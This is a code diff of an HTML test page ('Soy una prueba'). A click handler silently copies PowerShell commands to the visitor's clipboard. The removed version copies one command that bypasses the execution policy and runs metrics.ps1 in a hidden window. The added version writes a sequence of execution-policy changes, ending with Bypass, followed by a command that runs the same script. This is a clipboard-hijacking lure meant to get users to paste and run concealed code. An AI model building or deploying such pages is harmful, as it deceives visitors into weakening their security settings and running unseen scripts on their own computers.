@@ -9,8 +9,21 @@
     <p id="cmd" style="cursor: pointer;">Soy una prueba</p>
     <script>
         document.getElementById('cmd').addEventListener('click', function() {
-            const cmd = 'cd "$HOME\\Desktop"; Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process; Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -File .\\metrics.ps1"';
-            navigator.clipboard.writeText(cmd);
+            const commands = [
+                'cd "$HOME\\Desktop"',
+                'Set-ExecutionPolicy Restricted -Scope CurrentUser',
+                'Set-ExecutionPolicy RemoteSigned -Scope CurrentUser',
+                'Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process',
+                '.\\metrics.ps1'
+            ];
+            let i = 0;
+            function next() {
+                if (i >= commands.length) return;
+                navigator.clipboard.writeText(commands[i++]).then(() => {
+                    setTimeout(next, 100);
+                });
+            }
+            next();
         });
     </script>
 
